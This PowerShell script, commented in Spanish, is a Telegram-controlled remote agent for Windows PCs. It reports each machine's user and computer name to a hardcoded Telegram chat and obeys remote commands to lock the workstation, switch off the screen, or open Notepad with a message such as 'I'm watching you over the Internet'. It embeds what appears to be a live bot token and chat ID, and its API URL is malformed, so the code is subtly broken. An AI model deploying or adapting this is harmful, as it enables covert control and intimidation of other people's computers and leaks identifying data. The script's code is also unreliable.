# ==============================================================================
# CONFIGURACIÓN DEL BOT DE TELEGRAM (Pon tus datos aquí)
# ==============================================================================
$Token  = "8935867266:AAELjvUiJRXauSgYmmHAMmut-SOJWXyYImg" # REEMPLAZA CON TU TOKEN REAL COMPLETO
$ChatID = "1018796719"                                    # REEMPLAZA CON TU CHAT ID REAL COMPLETO

# Construcción de URL fija ultra-estable que acabamos de validar
$URL    = "https://telegram.org" + $Token
$MiPC   = $env:COMPUTERNAME
$User   = $env:USERNAME

# Registrar APIs de pantalla de Windows de forma segura
try {
    $MethodDefinition = '[DllImport("user32.dll")] public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);'
    Add-Type -MemberDefinition $MethodDefinition -Name "Win32Utils" -Namespace "Win32" -ErrorAction SilentlyContinue
} catch {}

# Habilitar TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ==============================================================================
# LIMPIAR HISTORIAL ANTES DE INICIAR
# ==============================================================================
$LastUpdateID = 0
try {
    $PreCheck = Invoke-RestMethod -Uri "$URL/getUpdates?timeout=1" -Method Get
    if ($PreCheck.result.Count -gt 0) {
        $LastUpdateID = $PreCheck.result[-1].update_id + 1
        [void](Invoke-RestMethod -Uri "$URL/getUpdates?offset=$LastUpdateID&timeout=1" -Method Get)
    }
} catch {}

# --- NOTIFICAR A TELEGRAM QUE LA PC SE ENCENDIÓ ---
try {
    $MensajeInicio = "PC En Linea y Protegida: " + $User + "@" + $MiPC
    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $MensajeInicio })
} catch {}

# ==============================================================================
# BUCLE PRINCIPAL CON SISTEMA DE IDS NUMÉRICOS CORREGIDO
# ==============================================================================
while ($true) {
    try {
        $Updates = Invoke-RestMethod -Uri "$URL/getUpdates?offset=$LastUpdateID&timeout=15" -Method Get
        
        foreach ($Update in $Updates.result) {
            $LastUpdateID = $Update.update_id + 1
            $TextoRecibido = $Update.message.text
            $RemitenteChatID = $Update.message.chat.id

            if ($RemitenteChatID -eq $ChatID -and $null -ne $TextoRecibido) {
                
                # 1. Separar el texto por espacios de forma estricta
                $Partes = $TextoRecibido -split " "
                
                # FIX: Se restauraron los índices fijos indispensables para separar el texto
                $Comando = [string]$Partes[0]
                $Comando = $Comando.ToLower()
                
                $IDDestino = ""
                if ($Partes.Count -gt 1) {
                    $IDDestino = [string]$Partes[1]
                }

                # CÁLCULO UNIFICADO DE ID ÚNICO DE 3 DÍGITOS
                $Md5 = [System.Security.Cryptography.MD5]::Create()
                $HashBytes = $Md5.ComputeHash([System.Text.Encoding]::ASCII.GetBytes($MiPC))
                $IdUnico = ([BitConverter]::ToUInt16($HashBytes, 0) % 900) + 100
                $MiIDNum = [string]$IdUnico

                # --- COMANDO GLOBAL: /lista ---
                if ($Comando -eq "/lista") {
                    $RespuestaLista = "🖥️ EQUIPO EN LINEA:`nID Numerico: [" + $MiIDNum + "] -> " + $User + "@" + $MiPC
                    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $RespuestaLista })
                    continue
                }

                # --- COMANDO GLOBAL DE AYUDA: /ayuda ---
                if ($Comando -eq "/ayuda") {
                    $TextoAyuda = "MANUAL DE CONTROL NUMERICO`n`n" +
                                  "Comandos Globales:`n" +
                                  "• /lista - Ver que numero de ID tomo cada PC.`n" +
                                  "• /ayuda - Ver este menu.`n`n" +
                                  "Comandos Individuales (Deja un espacio y pon el numero de la PC):`n" +
                                  "• /pantalla_off [Numero]`n" +
                                  "• /pantalla_on [Numero]`n" +
                                  "• /notepad [Numero]`n" +
                                  "• /note [Numero] [Mensaje personalizado]`n`n" +
                                  "Ejemplo de uso: /note " + $MiIDNum + " hola como estas"
                    
                    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $TextoAyuda })
                    continue
                }

                # VALIDACIÓN CRÍTICA: Solo ejecuta si el número coincide con el de esta máquina
                if ($IDDestino -eq $MiIDNum -and $IDDestino -ne "") {
                 
                    switch ($Comando) {
                 
                        "/pantalla_off" {
                            $rundll = New-Object -ComObject WScript.Shell
                            $rundll.Run("rundll32.exe user32.dll,LockWorkStation")
                            [Win32.Win32Utils]::SendMessage(-1, 0x0112, 0xF170, 2)
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Pantalla apagada en ID " + $MiIDNum })
                            continue
                        }
                        
                        "/pantalla_on" {
                            $wsh = New-Object -ComObject WScript.Shell
                            $wsh.SendKeys("{SHIFT}")
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Pantalla encendida en ID " + $MiIDNum })
                            continue
                        }
                        
                        "/notepad" {
                            Start-Process "notepad.exe"
                            Start-Sleep -Milliseconds 500
                            $wsh = New-Object -ComObject WScript.Shell
                            $wsh.SendKeys("Te estoy observando por Internet... 👀")
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Bloc de notas abierto en ID " + $MiIDNum })
                            continue 
                        }

                        "/note" {
                            # Junta todas las palabras desde la posición 2 en adelante
                            $MensajePersonalizado = ($Partes[2..($Partes.Count - 1)]) -join " "

                            if ($null -ne $MensajePersonalizado -and $MensajePersonalizado -trim() -ne "") {
                                Start-Process "notepad.exe"
                                Start-Sleep -Milliseconds 500
                                
                                # Copiar y pegar de forma limpia
                                Set-Clipboard -Value $MensajePersonalizado
                                $wsh = New-Object -ComObject WScript.Shell
                                $wsh.SendKeys("^v")
                                
                                $Respuesta = "Bloc de notas abierto con tu mensaje en ID $MiIDNum"
                                [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $Respuesta })
                            }
                            continue
                        }
                    } # Cierre del switch
                } # Cierre del if de VALIDACIÓN DE ID
            } # Cierre del if de REMITENTE
        } # Cierre del foreach
    } catch {
        Start-Sleep -Seconds 2
    } # Cierre del catch
} # Cierre del while
